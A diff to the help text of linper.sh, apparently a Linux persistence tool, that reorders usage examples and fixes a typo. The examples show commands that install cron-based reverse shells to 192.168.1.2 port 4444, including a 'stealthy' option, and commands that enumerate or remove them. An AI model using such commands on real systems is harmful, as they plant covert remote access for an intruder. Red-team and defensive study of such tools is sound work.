@@ -36,14 +36,14 @@ HELP="\e[33m-h, --help\e[0m show this message
 
 EXAMPLES="Examples:
 
+\e[33mPrint\e[0m Commands that can be used to install persistence (assumes -d): bash linper.sh -i 192.168.1.2 -p 4444 --print 
 \e[33mEnumerate\e[0m binaries that can be used for persistence: bash linper.sh -d
 \e[33mEnumerate\e[0m defenses: bash linper.sh -e
-\e[33mPrint\e[0m Commands that can be used to install persistence (assumes -d): bash linper.sh -i 192.168.1.2 -p 4444 --print 
+\e[33mEnumerate\e[0m reverse shells and other modifications to the file system made by this program: bash linper.sh -i 192.168.1.2 -c -d
 \e[33mInstall\e[0m persistence (default cron & noisy): bash linper.sh -i 192.168.1.2 -p 4444
 \e[33mInstall\e[0m only 3 reverse shells: bash linper.sh -i 192.168.1.2 -p 4444 -l 3
 \e[33mInstall\e[0m persistence (custom cron & stealthy): bash linper.sh -i 192.168.1.2 -p 4444 --cron \"* * * 2 3\" -s
-\e[33mInsalll\e[0m persistence with supplied directory for temporary files: bash linper.sh -i 192.168.1.2 -p 4444 -w /tmp/i/do/not/exist
-\e[33mEnumerate\e[0m reverse shells and other modifications to the file system made by this program: bash linper.sh -i 192.168.1.2 -c -d
+\e[33mInstall\e[0m persistence with supplied directory for temporary files: bash linper.sh -i 192.168.1.2 -p 4444 -w /tmp/i/do/not/exist
 \e[33mRemove\e[0m persistence for 192.168.1.2: bash linper.sh -i 192.168.1.2 -c"
 
 while test $# -gt 0;
